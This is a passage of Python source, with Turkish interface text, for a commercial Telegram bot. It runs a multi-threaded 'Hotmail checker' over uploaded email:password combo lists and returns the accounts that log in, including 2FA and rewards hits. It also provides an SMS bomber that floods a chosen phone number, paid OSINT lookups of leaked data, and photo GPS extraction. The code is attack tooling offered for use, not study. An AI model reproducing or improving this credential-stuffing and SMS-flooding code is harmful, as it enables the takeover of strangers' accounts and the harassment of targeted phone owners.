                continue

            HOTMAIL_START_TIME = time.time()
            HOTMAIL_HIT = 0
            HOTMAIL_BAD = 0
            HOTMAIL_ERROR = 0
            HOTMAIL_2FA = 0
            HOTMAIL_REWARDS = 0
            HOTMAIL_KEYWORD_HITS = {}
            HOTMAIL_COUNTRY_HITS = {}

            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = {
                    "user_id": task.user_id,
                    "user_name": task.user_name,
                    "combo_list": task.combo_list,
                    "is_premium": task.is_premium,
                    "chat_id": task.chat_id,
                    "status_msg_id": task.status_msg_id,
                    "keywords": task.keywords
                }

            print(f"\n🚀 HOTMAIL TARAMA BAŞLADI | {task.user_name} | {len(task.combo_list)} satır")

            try:
                if main_bot:
                    main_bot.edit_message_text(
                        f"🚀 **Hotmail Checker Başladı!**\n\n"
                        f"👤 {task.user_name}\n"
                        f"📂 Toplam: {len(task.combo_list)} satır\n"
                        f"⚙️ Thread: {task.thread_count}\n"
                        f"{'⭐ Premium' if task.is_premium else '🆓 Free'}\n"
                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n\n"
                        f"📌 İlerleme: 0/{len(task.combo_list)}",
                        task.chat_id, task.status_msg_id
                    )
            except:
                pass

            try:
                with ThreadPoolExecutor(max_workers=task.thread_count) as executor:
                    futures = []
                    for line in task.combo_list:
                        futures.append(executor.submit(
                            hotmail_worker, line, task.user_id, task.user_name,
                            task.is_premium, task.keywords
                        ))

                    processed = 0
                    total = len(task.combo_list)

                    for future in as_completed(futures):
                        processed += 1
                        try:
                            future.result()
                        except:
                            pass

                        if processed % 10 == 0 or processed == total:
                            try:
                                if main_bot:
                                    elapsed = int(time.time() - HOTMAIL_START_TIME)
                                    cpm = int(processed / (elapsed / 60)) if elapsed > 0 else 0
                                    main_bot.edit_message_text(
                                        f"🚀 **Hotmail Checker Çalışıyor**\n\n"
                                        f"👤 {task.user_name}\n"
                                        f"📂 İlerleme: {processed}/{total} (%{int(processed/total*100)})\n"
                                        f"✅ Hit: {HOTMAIL_HIT} | ❌ Bad: {HOTMAIL_BAD}\n"
                                        f"🔐 2FA: {HOTMAIL_2FA} | ⚠️ Error: {HOTMAIL_ERROR}\n"
                                        f"⚙️ Thread: {task.thread_count} | ⚡️ CPM: {cpm}\n"
                                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n\n"
                                        f"{'⭐ Premium' if task.is_premium else '🆓 Free'}",
                                        task.chat_id, task.status_msg_id
                                    )
                            except:
                                pass
            except:
                pass

            elapsed = int(time.time() - HOTMAIL_START_TIME)
            total = HOTMAIL_HIT + HOTMAIL_BAD + HOTMAIL_ERROR + HOTMAIL_2FA

            result_lines = [
                "✅ **Tarama Tamamlandı!**",
                "━━━━━━━━━━━━━━━━━━━━━",
                f"📁 Dosya: hits_{task.user_id}.txt",
                f"📊 Toplam: {total}",
                "",
                f"✅ HIT: {HOTMAIL_HIT}",
                f"🎁 Rewards Hits: {HOTMAIL_REWARDS}",
                f"🔐 2FA: {HOTMAIL_2FA}",
                f"❌ BAD: {HOTMAIL_BAD}",
                f"⚠️ ERROR: {HOTMAIL_ERROR}",
                "",
                f"⏰ Süre: {elapsed} dk" if elapsed >= 60 else f"⏰ Süre: {elapsed} sn",
                f"⚡️ Ort. CPM: {int(total / (elapsed / 60)) if elapsed > 0 else 0}",
                "",
                "🏷️ **KEYWORDS:**"
            ]

            for kw, count in HOTMAIL_KEYWORD_HITS.items():
                pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                result_lines.append(f"🎯 {kw}: {count} Hit (%{pct})")

            if not HOTMAIL_KEYWORD_HITS:
                result_lines.append("   ❌ Keyword eşleşmesi yok")

            result_lines.append("")
            result_lines.append("🌍 **COUNTRIES:**")

            sorted_countries = sorted(HOTMAIL_COUNTRY_HITS.items(), key=lambda x: x[1], reverse=True)[:10]
            for country, count in sorted_countries:
                pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                flag = get_country_flag(country)
                result_lines.append(f"{flag} {country}: {count} Hit (%{pct})")

            if not sorted_countries:
                result_lines.append("   ❌ Ülke bilgisi yok")

            result_lines.append("")
            result_lines.append("📤 Sonuçlar gönderiliyor...")

            result_text = "\n".join(result_lines)

            try:
                if main_bot:
                    main_bot.edit_message_text(result_text, task.chat_id, task.status_msg_id)
                    hit_file = f"hits_{task.user_id}.txt"
                    if os.path.exists(hit_file) and os.path.getsize(hit_file) > 0:
                        with open(hit_file, "rb") as f:
                            main_bot.send_document(
                                task.chat_id, f,
                                caption=f"✅ {HOTMAIL_HIT}x Hotmail Hit\n\n📊 Toplam Hit: {HOTMAIL_HIT}"
                            )
                        os.remove(hit_file)
            except:
                pass

            print(f"✅ TARAMA TAMAMLANDI | {task.user_name} | HIT: {HOTMAIL_HIT}")

            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = None

        except Exception as e:
            print(f"[QUEUE ERROR] {e}")
            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = None


def start_queue_processor():
    global HOTMAIL_QUEUE_RUNNING, HOTMAIL_QUEUE_THREAD
    if HOTMAIL_QUEUE_RUNNING:
        return
    HOTMAIL_QUEUE_RUNNING = True
    HOTMAIL_QUEUE_THREAD = threading.Thread(target=process_hotmail_queue, daemon=True)
    HOTMAIL_QUEUE_THREAD.start()


def add_to_queue(task: HotmailTask):
    with HOTMAIL_QUEUE_LOCK:
        position = HOTMAIL_QUEUE.qsize() + 1
        if HOTMAIL_CURRENT_TASK:
            position += 1
        task.queue_position = position
        HOTMAIL_QUEUE.put(task)

    try:
        if main_bot:
            is_prem = task.is_premium
            limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
            main_bot.send_message(
                task.chat_id,
                f"🚀 **Hotmail taraması sıraya alınıyor...**\n\n"
                f"⏳ **Sıraya Alındınız! Sıra Numaranız:** {position}\n\n"
                f"⚠️ **Sebep:** {'⭐ Premium kullanıcı (Sınırsız)' if is_prem else f'🆓 Free kullanıcı ({FREE_CHECK_LIMIT} satır limit)'}\n\n"
                f"🔀 **Modül:** HOTMAIL\n\n"
                f"Sıranızı takip etmek için /queue komutunu kullanabilirsiniz.\n"
                f"Sıra size geldiğinde otomatik başlayacak.\n\n"
                f"📊 **Limit:** {limit_text} satır\n"
                f"🔖 **Keyword Limit:** {get_keyword_limit_text(task.user_id)}"
            )
    except:
        pass


def _process_hotmail_file(msg, bot_instance):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!")
        return

    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]

        if not combo_list:
            bot_instance.reply_to(msg, "❌ Dosyada geçerli combo (email:password) bulunamadı!")
            return

        is_prem = is_premium(uid)
        max_lines = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT

        if len(combo_list) > max_lines:
            bot_instance.reply_to(
                msg,
                f"⚠️ **Dosya çok büyük!**\n\n"
                f"📂 Dosyada {len(combo_list)} satır var.\n"
                f"📌 {'⭐ Premium' if is_prem else '🆓 Free'} limit: {max_lines} satır\n\n"
                f"Lütfen dosyayı {max_lines} satıra indirip tekrar gönderin."
            )
            return

        m = bot_instance.reply_to(
            msg,
            f"✅ **{len(combo_list)}** satır bulundu.\n\n"
            f"⚙️ Thread sayısını girin (10-100):\n"
            f"Varsayılan: 10"
        )
        bot_instance.register_next_step_handler(m, lambda m: _start_hotmail_scan_queue(m, combo_list, bot_instance))
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")


def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
    uid = msg.from_user.id
    global HOTMAIL_THREADS

    try:
        thread_count = int(msg.text.strip())
        if thread_count < 1:
            thread_count = 10
        elif thread_count > 100:
            thread_count = 100
    except:
        thread_count = 10

    HOTMAIL_THREADS = thread_count
    is_prem = is_premium(uid)
    user_name = get_user_name(uid)
    keywords = get_user_keywords(uid)

    start_queue_processor()

    status_msg = bot_instance.reply_to(
        msg,
        f"⏳ **Dosyanız sıraya alınıyor...**\n\n"
        f"👤 {user_name}\n"
        f"📂 {len(combo_list)} satır\n"
        f"⚙️ Thread: {thread_count}\n"
        f"{'⭐ Premium' if is_prem else '🆓 Free'}\n"
        f"🔖 Keywordler: {', '.join(keywords)}"
    )

    task = HotmailTask(
        user_id=uid,
        user_name=user_name,
        combo_list=combo_list,
        thread_count=thread_count,
        status_msg_id=status_msg.message_id,
        chat_id=msg.chat.id,
        is_premium=is_prem,
        keywords=keywords
    )

    add_to_queue(task)


def get_queue_status_text(user_id: int = None) -> str:
    with HOTMAIL_QUEUE_LOCK:
        lines = ["⏳ **BEKLEYEN SIRALAR (QUEUE)**", "━━━━━━━━━━━━━━━━━━━━━"]
        if HOTMAIL_CURRENT_TASK:
            task = HOTMAIL_CURRENT_TASK
            prem = "⭐ PREMIUM" if task.get("is_premium") else "🆓 FREE"
            lines.append(f"  🔄 **[HOTMAIL] [{prem}] {task.get('user_name')} | İşleniyor ({len(task.get('combo_list', []))} satır)**")
        else:
            lines.append("  ⏸️ Şu an işlem yok")
        queue_list = list(HOTMAIL_QUEUE.queue)
        if queue_list:
            lines.append("")
            lines.append(f"  📊 **Sırada Bekleyenler ({len(queue_list)})**")
            lines.append("")
            for i, task in enumerate(queue_list, 1):
                prem = "⭐ PREMIUM" if task.is_premium else "🆓 FREE"
                lines.append(f"  {i}. **[HOTMAIL] [{prem}] {task.user_name} | ⏳ Sırada ({len(task.combo_list)} satır)**")
        else:
            lines.append("  📭 Sırada bekleyen yok")
        lines.append("")
        lines.append("👨‍💻 @hackledin")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════
#  HANDLER FUNCTIONS
# ══════════════════════════════════════════════════════════════

main_bot = None


def register_handlers(bot_instance):
    global main_bot
    main_bot = bot_instance

    @bot_instance.message_handler(commands=["start"])
    def cmd_start(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(
                msg,
                f"🚫 **YASAKLANDINIZ!**\n\n"
                f"📌 Sebep: {get_ban_reason(uid)}\n\n"
                f"📞 İtiraz için: @hackledin"
            )
            return

        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")

        mk = InlineKeyboardMarkup(row_width=3)
        mk.add(_btn("🇹🇷 Türkçe", "lang_tr"), _btn("🇬🇧 English", "lang_en"), _btn("🇸🇦 العربية", "lang_ar"))
        bot_instance.reply_to(msg, s(uid, "lang_pick"), reply_markup=mk)

    @bot_instance.message_handler(commands=["premium"])
    def cmd_premium(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        if is_premium(uid):
            bot_instance.reply_to(msg, s(uid, "already_premium"))
            return

        txt = (
            f"{s(uid, 'premium_title')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"{s(uid, 'premium_price_txt', price=PREMIUM_PRICE)}\n"
            f"{s(uid, 'premium_dur')}\n\n"
            f"{s(uid, 'premium_features')}"
        )
        bot_instance.reply_to(msg, txt, reply_markup=premium_kb(uid))

    @bot_instance.message_handler(commands=["hotmail"])
    def cmd_hotmail(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        user_name = get_user_name(uid)
        keywords = get_user_keywords(uid)
        limit_text = get_keyword_limit_text(uid)
        is_prem = is_premium(uid)
        capture_left = get_capture_limit_text(uid)

        bot_instance.reply_to(
            msg,
            f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Kullanıcı: {user_name}\n"
            f"🔖 Keyword: {', '.join(keywords)}\n"
            f"📊 Keyword Limit: {limit_text}\n"
            f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
            f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n\n"
            f"📌 Aşağıdaki menüden işlem yapın:",
            reply_markup=hotmail_keyboard(uid)
        )

    @bot_instance.message_handler(commands=["queue", "sıra"])
    def cmd_queue_status(msg):
        uid = msg.from_user.id
        text = get_queue_status_text(uid)
        bot_instance.reply_to(msg, text)

    @bot_instance.message_handler(commands=["profil"])
    def cmd_profile(msg):
        uid = msg.from_user.id
        _show_profile(msg.chat.id, uid, bot_instance)

    @bot_instance.message_handler(commands=["istatistik"])
    def cmd_stats_detailed(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        tu, prem_pu, osint_pu, tc, tch = get_bot_stats()

        stats_text = (
            f"📊 **SİSTEM İSTATİSTİKLERİ**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Toplam Kullanıcı: {tu}\n"
            f"📧 Hotmail Premium: {prem_pu or 0}\n"
            f"🌍 OSINT Premium: {osint_pu or 0}\n"
            f"📦 Toplam Combo: {tc or 0}\n"
            f"🔍 Toplam Sorgu: {tch or 0}\n\n"
            f"👨‍💻 @hackledin"
        )
        bot_instance.reply_to(msg, stats_text)

    @bot_instance.message_handler(commands=["exif", "foto", "meta"])
    def cmd_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        bot_instance.reply_to(
            msg,
            "📸 <b>EXIF Metadata Okuyucu</b>\n"
            f"{'━' * 28}\n\n"
            "Analiz etmek istediğin fotoğrafı gönder.\n\n"
            "📋 <b>Okunacak Bilgiler:</b>\n"
            "• 📱 Cihaz markası ve modeli\n"
            "• 📅 Çekim tarihi ve saati\n"
            "• 📐 Çözünürlük ve teknik parametreler\n"
            "• 🎯 ISO, diyafram, obtüratör, odak\n"
            "• ⚡ Flaş durumu ve lens bilgisi\n"
            "• 📍 GPS koordinatları (varsa)\n"
            "• 🗺 Google Maps linki (varsa)\n\n"
            "<i>⚠️ Sosyal medyadan indirilmiş fotoğraflarda "
            "EXIF silinmiş olabilir.</i>",
            parse_mode="HTML"
        )

    @bot_instance.message_handler(commands=["sarki", "muzik", "music", "song"])
    def cmd_music(msg):
        _process_music(msg, bot_instance)

    @bot_instance.message_handler(commands=["addbot"])
    def cmd_addbot(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        parts = msg.text.split()
        if len(parts) < 2:
            bot_instance.reply_to(msg, s(uid, "multi_bot_add_usage"))
            return
        token = parts[1].strip()
        if len(token) < 30:
            bot_instance.reply_to(msg, "❌ Geçersiz token formatı!")
            return
        if token == BOT_TOKEN:
            bot_instance.reply_to(msg, "❌ Ana botun token'ı eklenemez!")
            return
        with _PROC_LOCK:
            if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
                bot_instance.reply_to(msg, s(uid, "multi_bot_exists"))
                return
        try:
            success = _spawn_bot(token, uid)
            if success:
                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
                                             owner=msg.from_user.first_name or str(uid)))
            else:
                bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
        except Exception as e:
            bot_instance.reply_to(msg, f"❌ Hata: {e}")

    @bot_instance.message_handler(commands=["video"])
    def cmd_video(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return
        m = bot_instance.reply_to(msg, s(uid, "video_ask"))
        bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))

    @bot_instance.message_handler(commands=["smsbomb", "sms"])
    def cmd_smsbomb(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        with _SMS_LOCK:
            if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                sess = _SMS_SESSIONS[uid]
                bot_instance.reply_to(
                    msg,
                    f"⚠️ <b>Aktif Bombardıman Var!</b>\n\n"
                    f"📱 Hedef: <code>{sess['target']}</code>\n"
                    f"📊 Gönderilen: <b>{sess['count']}</b>\n"
                    f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n\n"
                    f"🛑 Önce durdurun: /smsstop"
                )
                return
        m = bot_instance.reply_to(
            msg,
            "💣 <b>SMS Bomber</b>\n\n"
            "📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\n"
            "Örnek: <code>5306524123</code>"
        )
        bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))

    @bot_instance.message_handler(commands=["smsstop"])
    def cmd_smsstop(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS or not _SMS_SESSIONS[uid].get("running"):
                bot_instance.reply_to(msg, "❌ Aktif SMS bombardımanı bulunamadı.")
                return
            sess = _SMS_SESSIONS[uid]
            sess["event"].set()
            sess["running"] = False
            count = sess["count"]
            target = sess["target"]
        bot_instance.reply_to(
            msg,
            f"🛑 <b>SMS Bomber Durduruldu</b>\n\n"
            f"📱 Hedef: <code>{target}</code>\n"
            f"📊 Toplam Gönderilen: <b>{count}</b> SMS"
        )

    @bot_instance.message_handler(commands=["smsstatus"])
    def cmd_smsstatus(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS:
                bot_instance.reply_to(msg, "📊 Hiç SMS bombardımanı başlatılmadı.")
                return
            sess = dict(_SMS_SESSIONS[uid])
        status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
        bot_instance.reply_to(
            msg,
            f"📊 <b>SMS Bomber Durumu</b>\n\n"
            f"📱 Hedef: <code>{sess['target']}</code>\n"
            f"📌 Durum: <b>{status}</b>\n"
            f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n"
            f"📊 Gönderilen: <b>{sess['count']}</b> SMS\n"
            f"🕐 Başlangıç: {sess.get('start_time', '—')}"
        )

    @bot_instance.message_handler(commands=["admin"])
    def cmd_admin(msg):
        uid = msg.from_user.id
        if uid != ADMIN_ID:
            bot_instance.reply_to(msg, s(uid, "admin_only"))
            return

        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(
            _btn("📊 Bot İstatistik", "adm_stats"),
            _btn("⭐ Premium Kullanıcılar", "adm_prem_users"),
            _btn("📋 Premium Log", "adm_prem_log"),
            _btn("⭐ Premium Ver", "adm_give_premium"),
            _btn("➖ Premium Kaldır", "adm_remove"),
            _btn("🚫 Kullanıcı Banla", "adm_ban"),
            _btn("✅ Kullanıcı Ban Kaldır", "adm_unban"),
            _btn("📋 Yasaklı Listesi", "adm_banned"),
            _btn("📢 Duyuru Gönder", "adm_announce"),
            _btn("🤖 Tüm Botları Listele", "adm_listbots"),
            _btn("📋 Hotmail Log", "adm_hotmail_log"),
        )
        bot_instance.reply_to(msg, "👑 <b>ADMIN PANELİ</b>", reply_markup=mk)

    @bot_instance.message_handler(content_types=["photo", "document"])
    def handle_photo_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        caption = (msg.caption or "").strip().lower()
        exif_trigger = any(
            caption == t or caption.startswith(t + " ")
            for t in ("/exif", "/meta", "/foto", "exif", "meta")
        )

        if msg.content_type == "document":
            doc = msg.document
            if doc.mime_type not in (
                "image/jpeg", "image/jpg", "image/png",
                "image/tiff", "image/webp", "image/heic"
            ):
                if exif_trigger:
                    bot_instance.reply_to(msg,
                        "❌ Bu dosya bir resim değil!\n"
                        "Desteklenen formatlar: JPEG, PNG, TIFF, WEBP"
                    )
                return

        if caption != "" and not exif_trigger:
            return

        wait_msg = bot_instance.reply_to(msg, "🔍 Fotoğraf analiz ediliyor, lütfen bekle...")

        gecici = f"/tmp/exif_{uid}_{int(time.time())}.jpg"
        try:
            if msg.content_type == "photo":
                file_id = msg.photo[-1].file_id
                file_info = bot_instance.get_file(file_id)
                dosya = bot_instance.download_file(file_info.file_path)
            else:
                file_info = bot_instance.get_file(msg.document.file_id)
                dosya = bot_instance.download_file(file_info.file_path)

            with open(gecici, "wb") as f:
                f.write(dosya)

            sonuc, hata = _exif_analiz(gecici)

            if hata:
                bot_instance.edit_message_text(
                    hata,
                    wait_msg.chat.id, wait_msg.message_id,
                    parse_mode="HTML"
                )
                return

            mesaj = _exif_mesaj_olustur(sonuc)
            bot_instance.edit_message_text(
                mesaj,
                wait_msg.chat.id, wait_msg.message_id,
                parse_mode="HTML",
                disable_web_page_preview=False
            )

        except Exception as e:
            try:
                bot_instance.edit_message_text(
                    f"❌ Beklenmeyen hata: <code>{e}</code>",
                    wait_msg.chat.id, wait_msg.message_id,
                    parse_mode="HTML"
                )
            except Exception:
                bot_instance.reply_to(msg, f"❌ Hata: {e}")
        finally:
            try:
                os.remove(gecici)
            except Exception:
                pass

    MENU_KEYS = {
        "tr": {"combo": "📦 Combo Çek", "tools": "🛠 Araçlar", "stats": "📊 İstatistik",
               "profile": "👤 Profil", "lb": "🏆 Lider Tablosu", "api": "⚙️ API Değiştir", "help": "❓ Yardım"},
        "en": {"combo": "📦 Combo Check", "tools": "🛠 Tools", "stats": "📊 Statistics",
               "profile": "👤 Profile", "lb": "🏆 Leaderboard", "api": "⚙️ Change API", "help": "❓ Help"},
        "ar": {"combo": "📦 فحص كومبو", "tools": "🛠 الأدوات", "stats": "📊 الإحصائيات",
               "profile": "👤 الملف الشخصي", "lb": "🏆 المتصدرون", "api": "⚙️ تغيير API", "help": "❓ مساعدة"},
    }

    @bot_instance.message_handler(func=lambda m: True, content_types=["text"])
    def handle_text(msg):
        uid = msg.from_user.id

        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
            return

        txt = msg.text
        l = lang(uid)
        keys = MENU_KEYS.get(l, MENU_KEYS["tr"])
        if txt == keys.get("combo"):
            m = bot_instance.reply_to(msg, s(uid, "combo_ask"))
            bot_instance.register_next_step_handler(m, lambda m: _process_combo(m, bot_instance))
        elif txt == keys.get("tools"):
            bot_instance.reply_to(msg, s(uid, "select_op"), reply_markup=tools_kb(uid))
        elif txt == keys.get("stats"):
            _show_stats(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("profile"):
            _show_profile(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("lb"):
            _show_leaderboard(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("api"):
            _show_api_menu(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("help"):
            _show_help(msg.chat.id, uid, bot_instance)

    @bot_instance.callback_query_handler(func=lambda c: True)
    def handle_cb(call):
        try:
            uid = call.from_user.id
            data = call.data

            if data.startswith("lang_"):
                l = data[5:]
                db_set(uid, "language", l)
                name = call.from_user.first_name or "User"
                status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
                try:
                    bot_instance.answer_callback_query(call.id, s(uid, "lang_ok"))
                except:
                    pass
                try:
                    bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except:
                    pass

                bot_instance.send_message(
                    call.message.chat.id,
                    s(uid, "welcome", name=name, status=status),
                    reply_markup=main_kb(uid)
                )
                return

            if data == "noop":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "goto_home":
                try:
                    bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except:
                    pass
                bot_instance.send_message(call.message.chat.id, "🏠", reply_markup=main_kb(uid))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "goto_tools":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                try:
                    bot_instance.edit_message_text(s(uid, "select_op"), call.message.chat.id,
                                                   call.message.message_id, reply_markup=tools_kb(uid))
                except:
                    bot_instance.send_message(call.message.chat.id, s(uid, "select_op"), reply_markup=tools_kb(uid))
                return

            if data == "menu_turkey":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                try:
                    bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                                           reply_markup=turkey_kb(uid))
                except:
                    bot_instance.send_message(call.message.chat.id, "🇹🇷", reply_markup=turkey_kb(uid))
                return

            if data == "menu_ls":
                if not is_premium_osint(uid):
                    mk = InlineKeyboardMarkup()
                    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
                    mk.add(_btn(s(uid, "back_btn"), "goto_tools"))
                    txt = (f"🔒 <b>LeakSights OSINT — Premium</b>\n\n"
                           f"💰 Fiyat: 200 Yıldız\n"
                           f"♾️ Süre: Sınırsız (Ömür Boyu)\n\n"
                           f"🔍 30+ OSINT Sorgu")
                    try:
                        bot_instance.answer_callback_query(call.id)
                    except:
                        pass
                    try:
                        bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=mk)
                    except:
                        bot_instance.send_message(call.message.chat.id, txt, reply_markup=mk)
                else:
                    try:
                        bot_instance.answer_callback_query(call.id)
                    except:
                        pass
                    try:
                        bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                                               reply_markup=ls_kb(uid))
                    except:
                        bot_instance.send_message(call.message.chat.id, "🌍 LeakSights", reply_markup=ls_kb(uid))
                return

            if data == "buy_premium":
                if is_premium(uid):
                    try:
                        bot_instance.answer_callback_query(call.id, "⭐ Zaten Premium sahibisiniz!", show_alert=True)
                    except:
                        pass
                    return
                prices = [LabeledPrice(label="⭐ Premium Üyelik", amount=PREMIUM_PRICE)]
                bot_instance.send_invoice(
                    call.message.chat.id,
                    title="Premium Üyelik",
                    description="Sınırsız Hotmail + Capture + Keyword",
                    invoice_payload="premium",
                    provider_token="",
                    currency="XTR",
                    prices=prices
                )
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "buy_osint":
                if is_premium_osint(uid):
                    try:
                        bot_instance.answer_callback_query(call.id, "🌍 Zaten OSINT Premium sahibisiniz!", show_alert=True)
                    except:
                        pass
                    return
                prices = [LabeledPrice(label="🌍 OSINT Premium", amount=OSINT_PRICE)]
                bot_instance.send_invoice(
                    call.message.chat.id,
                    title="OSINT Premium",
                    description="LeakSights OSINT - 30+ Sorgu",
                    invoice_payload="osint",
                    provider_token="",
                    currency="XTR",
                    prices=prices
                )
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "tool_exif":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                bot_instance.send_message(
                    call.message.chat.id,
                    "📸 <b>EXIF Metadata Okuyucu</b>\n"
                    f"{'━' * 28}\n\n"
                    "Analiz etmek istediğin fotoğrafı gönder.\n\n"
                    "<i>⚠️ Sosyal medyadan indirilmiş fotoğraflarda "
                    "EXIF silinmiş olabilir.</i>",
                    parse_mode="HTML"
                )
                return

            if data == "tool_music":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                bot_instance.send_message(
                    call.message.chat.id,
                    "🎵 **Müzik İndirici (MP3)**\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "📌 **Kullanım:**\n"
                    "`/sarki Sanatçı Şarkı`\n"
                    "`/sarki https://youtube.com/...`\n\n"
                    "🎯 **Örnekler:**\n"
                    "`/sarki Tarkan Dudu`\n"
                    "`/sarki Hadise Feryat`\n\n"
                    "📁 Format: `.mp3` (192 kbps)"
                )
                return

            if data.startswith("sms_"):
                parts = data.split("_")
                mode = parts[1]
                phone = parts[2]
                mail = parts[3] if len(parts) > 3 else ""

                if mode == "normal":
                    m = bot_instance.send_message(
                        call.message.chat.id,
                        f"⚡ **Normal Mod Seçildi**\n\n"
                        f"📱 Hedef: <code>{phone}</code>\n\n"
                        f"🔢 Limit gir (Sonsuz için 0):\n"
                        f"⏱ Aralık gir (saniye, 0=anında):\n\n"
                        f"Örnek: <code>50 2</code> (50 SMS, 2 saniye aralık)"
                    )
                    bot_instance.register_next_step_handler(m, lambda m: _sms_normal_settings(m, phone, mail, bot_instance))
                else:
                    _launch_sms_bomb(uid, phone, mail, "turbo", None, 0, bot_instance)
                    try:
                        bot_instance.answer_callback_query(call.id, "🚀 Turbo mod başlatıldı!")
                    except:
                        pass
                return

            if data == "tool_addbot":
                prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get("addbot")
                m = bot_instance.send_message(call.message.chat.id, prompt)
                bot_instance.register_next_step_handler(m, lambda m: _process_addbot(m, bot_instance))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "tool_php2py":
                bot_instance.send_message(call.message.chat.id, s(uid, "php2py"))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "tool_smsbomb":
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                        try:
